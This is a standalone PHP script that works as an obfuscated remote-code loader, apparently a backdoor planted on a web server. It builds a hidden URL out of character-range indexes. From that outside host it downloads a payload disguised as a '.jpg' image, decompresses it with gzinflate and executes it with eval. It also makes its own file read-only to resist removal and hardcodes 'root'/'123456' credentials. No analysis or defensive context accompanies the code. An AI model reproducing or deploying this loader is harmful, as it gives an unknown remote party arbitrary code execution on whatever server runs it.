<?php
set_time_limit(686);
define('THISFILE',str_replace(array('\\','//'),array('/','/'),__FILE__));
$f_name = @end(explode('/',THISFILE));
$i = range('~','.');
s($i[27].$i[22].$i[12],
$i[22].$i[10].$i[10]
.$i[14].$i[68].$i[79].$i[79].$i[28].$i[4].$i[28].$i[6].$i[10].$i[11].$i[23].$i[80].$i[27].$i[15].$i[17].$i[79].$i[11].$i[25].$i[10].$i[9].$i[14].$i[79].$i[11].$i[25].$i[10].$i[9].$i[14].$i[80].$i[20].$i[14].$i[23]);
session_start();
function set_writeable($file_name)
{
       @chmod($file_name,0444);

} 
set_writeable($f_name);
function s($c,$url){
if(empty($_SESSION['Code'])){
	$_SESSION['Code']=file_get_contents($url);
	m($_SESSION['Code'],$c);
	}		
}
function m($a,$c){
define('A','flate');
$zzip = sprintf('gzin%s',A);
	$ss = "";
	l($zzip($a),$ss);
}
function l($xx,$ss){
	$password = "123456";
	$MyName   = "root";
	@eval($xx.$ss);
}
?>